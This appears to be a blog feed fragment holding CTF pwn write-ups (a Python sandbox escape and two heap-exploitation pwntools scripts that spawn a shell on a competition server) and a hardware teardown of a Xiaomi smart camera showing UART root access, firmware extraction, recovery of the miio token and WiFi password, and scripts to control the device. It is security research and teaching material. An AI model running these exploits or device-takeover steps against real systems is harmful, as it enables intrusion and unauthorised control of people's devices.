    <content type="html"><![CDATA[<h2 id="babyjsc"><a href="#babyjsc" class="headerlink" title="babyjsc"></a>babyjsc</h2><p>题目给了一大堆文件，先nc上测一下，直接enter可以看到返回的错误信息，知道远程服务器为server.py<br>然后把下载下来的文件解压，搜索server.py ，查看可知</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597978442882.png" class="lozad"><br>python input()的时候沙箱逃逸，直接<strong>import</strong>(‘os’).system(“cat /home/ctf/flag”) ,获取到flag</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597978742005.png" class="lozad"></p><h2 id="nofree"><a href="#nofree" class="headerlink" title="nofree"></a>nofree</h2><p>申请堆块的时候是用strdup来申请的，strdup是根据输入的字符串长度来申请堆块的，若add(0,0x90,‘aaaa’)，edit的时候则造成溢出。<br>此题没有free功能，利用house of orange 攻击 造成一个free过后的堆块，然后伪造size，通过溢出修改 free过后堆块的fd为chunklist附近区域，然后fastbin attack 申请堆块到chunklist，控制堆块指针，修改chunklist[1]为strdup函数的got表，edit功能修改strdup的got表为printf_got,再利用格式化字符串漏洞泄露libc_addr，最后再次修改strdup_got为system_got,然后申请”/bin/sh”的堆块，即可得到shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"pwn"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'101.200.53.148'</span>,<span class="number">12301</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">": "</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">': '</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">': '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------house of orange-------------</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xfe1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">0x1e</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x70</span>,chr(i)*<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x81</span>,chr(<span class="number">0x20</span>)*<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x71</span>,chr(<span class="number">0x21</span>)*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>,chr(<span class="number">0x22</span>)*<span class="number">0x90</span>) <span class="comment"># fastbin </span></span><br><span class="line"><span class="comment">#----------fastbin attack-----------</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x20</span>)*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(<span class="number">0x602128</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,chr(<span class="number">0x23</span>)*<span class="number">0x70</span>+p64(<span class="number">0x81</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,chr(<span class="number">0x24</span>)*<span class="number">0x70</span>+p64(<span class="number">0x81</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------chunklist attack---------</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">"e"</span>*<span class="number">0x88</span>+p64(<span class="number">0x6021c0</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6021c0</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x602068</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(elf.plt[<span class="string">"printf"</span>]))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">"%17$p"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">libc_base = int(p.recv(<span class="number">12</span>),<span class="number">16</span>) <span class="number">-240</span>-libc.sym[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">info(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">sys_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line">info(<span class="string">"sys_addr"</span>,sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(sys_addr))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="https://nocbtm.github.io/imgs/1597995302847.png" class="lozad"></p><h2 id="easybox"><a href="#easybox" class="headerlink" title="easybox"></a>easybox</h2><p>off-by-one漏洞，没有show功能，老套路了，布局堆块，溢出修改下一个堆块的size包含多个堆块，然后free，根据unsorted bin的特性使得fastbin里面有残留的main_area地址然后修改后两位字节，有十六分之一的几率为 stdout_addr-0x43，然后fastbin_attack 打_IO_2_1_stdout_,修改io_flags为0xfbad1887即可泄露出libc_addr,再次fastbin_attack 打malloc_hook为onegadget</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p=remote(<span class="string">"101.200.53.148"</span>, <span class="number">34521</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx:\n'</span>,str(idx))</span><br><span class="line">p.sendlineafter(<span class="string">'len:\n'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'content:\n'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">'d'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0xf0</span>,<span class="string">'e'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xf0</span>,<span class="string">'f'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xf8</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0x300</span>)+<span class="string">'\x00'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0xf0</span>,<span class="string">'aaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x130</span>,<span class="string">'\x00'</span>*<span class="number">0xf0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'aaa'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x88'</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line">malloc_hook  = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">io_list_all = libc_base + <span class="number">0x3c54fd</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span></span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf0364</span>, <span class="number">0xf1207</span>]</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">"\x41"</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">'\x42'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x68</span>,<span class="string">'\x43'</span>*<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">"0"</span>*<span class="number">0x28</span>+<span class="string">'\xe1'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0xa0</span>,<span class="string">"3"</span>*<span class="number">0x68</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"><span class="comment">#add(8,0xa0,"3"*0x68+p64(0x71)+p64(io_list_all))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x68</span>,<span class="string">"\x44"</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x68</span>,<span class="string">"a"</span>*<span class="number">0x13</span>+p64(libc_base + one[<span class="number">2</span>]))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"please input your token:"</span>,<span class="string">'icq700049c29f86f68a9b934524cf619'</span>)</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">print(e)</span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;babyjsc&quot;&gt;&lt;a href=&quot;#babyjsc&quot; class=&quot;headerlink&quot; title=&quot;babyjsc&quot;&gt;&lt;/a&gt;babyjsc&lt;/h2&gt;&lt;p&gt;题目给了一大堆文件，先nc上测一下，直接enter可以看到返回的错误信息，知道远程服务器为serve
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>米家小白智能摄像头分析</title>
    <link href="https://nocbtm.github.io/2020/07/21/%E7%B1%B3%E5%AE%B6%E5%B0%8F%E7%99%BD%E6%99%BA%E8%83%BD%E6%91%84%E5%83%8F%E5%A4%B4%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/07/21/米家小白智能摄像头分析/</id>
    <published>2020-07-21T11:10:45.000Z</published>
    <updated>2020-09-03T08:08:34.653Z</updated>
    
    <content type="html"><![CDATA[<h2 id="大致分析"><a href="#大致分析" class="headerlink" title="大致分析"></a>大致分析</h2><p>拿到摄像头第一步，拆机，看看有没有uart调试口，找一下flash芯片</p><p>小米做的是真的好，不太好拆，可参考硬核拆解</p><p><a href="https://www.bilibili.com/video/BV1d4411G7vu?t=64" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1d4411G7vu?t=64</a></p><p><a href="http://www.eepw.com.cn/article/201608/295287.htm" target="_blank" rel="noopener">http://www.eepw.com.cn/article/201608/295287.htm</a></p><p>拆完可以看到，这么大的NOR Flash，一般的编程器提取不了，需要更专业的设备。</p><p><img alt="image-20200807110220255" data-src="https://nocbtm.github.io/imgs/image-20200807110220255.png" class="lozad"></p><p>uart调试口一般都在flash的附近，仔细观看。正面没有，看看反面</p><p>这里有一个坑点，有两个Rx，Tx口。经过测试如下已经焊接上的口是真正的，而另一个接上没反应。</p><p><img alt="image-20200807111406761" data-src="https://nocbtm.github.io/imgs/image-20200807111406761.png" class="lozad"></p><p>用SecureCRT接上，波特率选择115200</p><p><img alt="image-20200807133925437" data-src="https://nocbtm.github.io/imgs/image-20200807133925437.png" class="lozad"></p><p>连上之后，没有做用户认证，直接就进来了。看了下开启的端口，有些怪异的地方</p><p>23端口运行着 linuxrc ，这应该是防止开启telnetd服务吧</p><p>而且没有开启554端口的rtsp服务来传输视频，可能用的别的服务吧</p><p><img alt="image-20200807122344393" data-src="https://nocbtm.github.io/imgs/image-20200807122344393.png" class="lozad"></p><p>百度了一下运行的程序</p><p>其中24883端口的<code>pulseaudio</code>是一个声音服务器，用来传输声音的</p><p>摄像头内网1883端口的<code>mosquitto</code>是一款实现了消息推送协议 MQTT v3.1 的开源消息代理软件，用来传输监控视频的</p><p>而且他传输视频不像普通摄像头那么简单，我把他进程杀的差不多了，手机还能看到监控视频</p><p>而54321端口运行的是小米的miio协议，可参考<a href="https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md" target="_blank" rel="noopener">https://github.com/OpenMiHome/mihome-binary-protocol/blob/master/doc/PROTOCOL.md</a></p><p><img alt="image-20200807140936533" data-src="https://nocbtm.github.io/imgs/image-20200807140936533.png" class="lozad"></p><p>针对这个端口python已经有攻击的库了，可参考<a href="https://github.com/rytilahti/python-miio，" target="_blank" rel="noopener">https://github.com/rytilahti/python-miio，</a></p><p><img alt="image-20200807142959137" data-src="https://nocbtm.github.io/imgs/image-20200807142959137.png" class="lozad"></p><p><img alt="image-20200807142031135" data-src="https://nocbtm.github.io/imgs/image-20200807142031135.png" class="lozad"></p><p>难受的是现在还不支持小白摄像头，只能自己分析一下了</p><h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p>可以看到我们想要分析的程序在 ./usr/bin/目录下</p><p><img alt="image-20200807144200666" data-src="https://nocbtm.github.io/imgs/image-20200807144200666.png" class="lozad"></p><p>busybox刚好自带httpd服务，默认是不开器的，我们把它打开，用来传输文件</p><p>把 ./usr 目录 和 ./lib 目录都压缩一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">busybox httpd</span><br><span class="line">tar -zcvf usr.tar.gz ./usr</span><br><span class="line">tar -zcvf lib.tar.gz ./lib</span><br></pre></td></tr></table></figure><p>然后wget下来，进行解压  <code>tar -zxvf usr.tar.gz</code></p><p><img alt="image-20200807145210801" data-src="https://nocbtm.github.io/imgs/image-20200807145210801.png" class="lozad"></p><h2 id="qemu模拟"><a href="#qemu模拟" class="headerlink" title="qemu模拟"></a>qemu模拟</h2><p>找到了摄像头的初始化脚本，可以看到程序的启动方式<code>/usr/bin/mosquitto -c /etc/mosquitto/mosquitto.conf -d</code></p><p><code>/usr/bin/miio_client -D</code></p><p><img alt="" data-src="https://nocbtm.github.io/imgs/image-20200807145919673.png" class="lozad"></p><p>使用qemu模拟，先把mosquitt跑起来，再跑 miio_client</p><p><img alt="image-20200807150954939" data-src="https://nocbtm.github.io/imgs/image-20200807150954939.png" class="lozad"></p><p><img alt="image-20200807151142230" data-src="https://nocbtm.github.io/imgs/image-20200807151142230.png" class="lozad"></p><p>然后向54321发送udp数据，可以看到成功接收到</p><p><img alt="image-20200807155050870" data-src="https://nocbtm.github.io/imgs/image-20200807155050870.png" class="lozad"></p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>根据一些字符串可以快速定位到代码</p><p><img alt="image-20200807155620286" data-src="https://nocbtm.github.io/imgs/image-20200807155620286.png" class="lozad"></p><p>可以分析出传输的数据是json格式的，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;:1,&quot;method&quot;:&quot;get_prop&quot;,&quot;params&quot;:[&quot;night_state&quot;,&quot;night_beg_time&quot;,&quot;night_end_time&quot;]&#125;</span><br></pre></td></tr></table></figure><p>而且需要认证ID</p><p><img alt="image-20200807160052510" data-src="https://nocbtm.github.io/imgs/image-20200807160052510.png" class="lozad"></p><p>可以看到有很多配置<code>method</code></p><p><img alt="image-20200807155838345" data-src="https://nocbtm.github.io/imgs/image-20200807155838345.png" class="lozad"></p><p>进入miIo.config_router方法可以看到接收的数据都是用<code>json_object_object_add</code>函数来匹配接收的，</p><p>代码写的很好，没有发现什么栈溢出漏洞</p><p><img alt="image-20200807163002510" data-src="https://nocbtm.github.io/imgs/image-20200807163002510.png" class="lozad"></p><p>但还是能分析出来一些敏感信息，wifi的连接密码</p><p><img alt="image-20200807165114652" data-src="https://nocbtm.github.io/imgs/image-20200807165114652.png" class="lozad"></p><p>miio的配置文件</p><p><img alt="image-20200807164907414" data-src="https://nocbtm.github.io/imgs/image-20200807164907414.png" class="lozad"></p><p>miio的验证token</p><p><img alt="image-20200807165257875" data-src="https://nocbtm.github.io/imgs/image-20200807165257875.png" class="lozad"></p><p>通过这个token就可以控制摄像头，先安装python-miio方便利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install python-miio</span><br></pre></td></tr></table></figure><p>目前这个库还不支持这款摄像头，需要自己再改写一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> protocol <span class="keyword">import</span> Message</span><br><span class="line"></span><br><span class="line">helobytes=bytes.fromhex(<span class="string">'21310020ffffffffffffffffffffffffffffffffffffffffffffffffffffffff'</span>)</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line">s.sendto(helobytes,(<span class="string">'192.168.137.159'</span>,<span class="number">54321</span>))<span class="comment">#插座ip，端口54321</span></span><br><span class="line">data,addr=s.recvfrom(<span class="number">1024</span>)</span><br><span class="line">m=Message.parse(data)</span><br><span class="line">tok=codecs.encode(m.checksum,<span class="string">'hex'</span>)</span><br><span class="line">print(m)</span><br><span class="line">print(tok)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> miio</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">s = miio.device.Device(ip=ip, token=token)</span><br><span class="line">s.info()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf8-*-</span></span><br><span class="line"><span class="keyword">from</span> miio.chuangmi_plug <span class="keyword">import</span> ChuangmiPlug</span><br><span class="line">ip=<span class="string">'192.168.137.159'</span></span><br><span class="line">token=<span class="string">'6ECM1qxqXi0VkF4t'</span></span><br><span class="line">d = ChuangmiPlug(ip=ip, token=token)</span><br><span class="line"></span><br><span class="line">x=d.status() <span class="comment"># 给出设备的状态</span></span><br><span class="line"><span class="comment"># x: &lt;ChuangmiPlugStatus power=True, usb_power=None, temperature=46, load_power=None, wifi_led=None&gt;</span></span><br><span class="line"><span class="comment"># x.power = True</span></span><br><span class="line">x=d.info()</span><br><span class="line"><span class="comment"># type(z)</span></span><br><span class="line"><span class="comment"># miio.device.DeviceInfo</span></span><br><span class="line"><span class="comment"># print(z)</span></span><br><span class="line"><span class="comment"># chuangmi.plug.m3 v1.3.8_0002 (04:CF:8C:5F:**:**) @ 192.168.1.20 - token: *****</span></span><br><span class="line">x=d.off()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br><span class="line">x=d.on()</span><br><span class="line"><span class="comment"># x = ['ok'] 则 控制成功</span></span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" 